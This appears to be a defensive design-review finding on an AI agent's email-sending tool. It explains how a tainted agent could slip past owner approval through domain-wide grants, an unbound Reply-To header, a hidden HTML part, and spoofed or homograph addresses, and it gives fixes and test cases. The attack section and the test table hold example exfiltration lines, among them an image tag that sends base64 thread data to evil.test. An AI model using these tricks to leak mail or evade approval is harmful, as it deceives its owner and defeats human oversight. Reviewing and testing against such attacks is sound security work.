# design-11: the email binding and grant key leave out where replies and copies actually go

**Severity:** High. **Surface:** `email.send` (Gmail, Graph, SMTP, JMAP connectors). **Docs:** 05 §3.5 (`email.send` row); 04 §4.1 (`grantKey: "email.send|gmail:…|example.com"`), §4.2; 02 §4.6 ("`email.send` plus a recipient domain"). **Owners:** S09, S05.

## Attack

1. **The grant key binds the recipient *domain*.** 04 §4.1 and 02 §4.6 key standing grants on the recipient domain; 05 §3.5 says "account + sorted recipient set". If S05 follows the data model, a `task` grant made for `mom@gmail.com` covers `anyone@gmail.com`. §3.6 escalates only targets that are *new*. If "new" is decided by grant-key match, `attacker@gmail.com` is not new and goes through without a card in a tainted turn. Destructive actions accept `task` scope, which lasts up to 24 h.
2. **Headers outside the hash.** The binding covers account, to/cc/bcc, subject, body hash and attachments. Not covered: `Reply-To`, `From` (send-as alias), `Sender`, `In-Reply-To` / `References` (threading the message into an attacker's thread), `List-Unsubscribe`, and arbitrary `X-` headers. A tainted agent sends the approved body to the approved recipient with `Reply-To: ceo-office@evil.test`; Alice's reply, with the signed permission slip, goes to the attacker. With a send-as alias, `From: "IT Support" <it@owner-domain>` is equally unseen.
3. **multipart/alternative divergence.** "Body hash (text and HTML parts)" hashes both, but the card's `bodyPreview` is text. The HTML part carries `<img src="https://evil.test/p?d=<base64 of thread>">` (exfiltration through remote images when the recipient opens it, or an attacker-addressed tracking pixel), or entirely different wording. Recipients' clients render the HTML.
4. **Address parsing.** `"alice@example.org" <attacker@evil.test>`, encoded words (`=?utf-8?b?…?=`), IDN homographs (`alice@exаmple.org` with a Cyrillic а), and comma-containing quoted local parts. If canonicalization lowercases the display form, or the card shows the display name, the owner approves the wrong address.

## Assumption broken

"Recipients + subject + body" captures who the mail reaches and what it says. MIME has more routing and rendering surfaces than that.

## Proposed control

- The grant key is account + **exact** sorted addr-spec set (05 §3.5 wins; fix 04 §4.1 and 02 §4.6). Taint "newness" compares exact addresses, never grant keys.
- Bind the **full outgoing header set** except `Date`, `Message-ID` and transport headers. Any of `Reply-To`, `From`, `Sender`, `Return-Path`, `References` or `In-Reply-To` that differs from the defaults is shown on the card.
- Hash the final MIME as it will be serialized, after the connector's composer runs. The card shows a text rendering **of the HTML part** when one exists, lists every URL and remote resource in it, and flags text/HTML divergence (Levenshtein ratio below 0.9 → warn).
- Parse addresses with a strict RFC 5322 parser. The card shows the addr-spec only, with punycode for any non-ASCII domain, and mixed-script local parts are rejected.

## Test case

| # | Grant / approval | Agent call | Expected |
| --- | --- | --- | --- |
| 1 | `task` grant from approving `mom@gmail.com` | tainted turn sends to `attacker@gmail.com` | `ask` (`taint:new_target`); grant key differs |
| 2 | `once` approval for to `alice@example.org`, body B | same, plus `replyTo: "x@evil.test"` | `binding_mismatch`; dispatch blocked |
| 3 | approval card request with text "Hi" and HTML containing `<img src=https://evil.test/p?d=…>` | `requestApproval` | `details.urls` contains `https://evil.test/p…`; `details.divergence: true` |
| 4 | `to: ['"alice@example.org" <attacker@evil.test>']` | approval | the card target is `attacker@evil.test` |
| 5 | `to: ["alice@exаmple.org"]` (Cyrillic а) | approval | target is shown as `alice@xn--exmple-4nf.org` with a mixed-script warning |
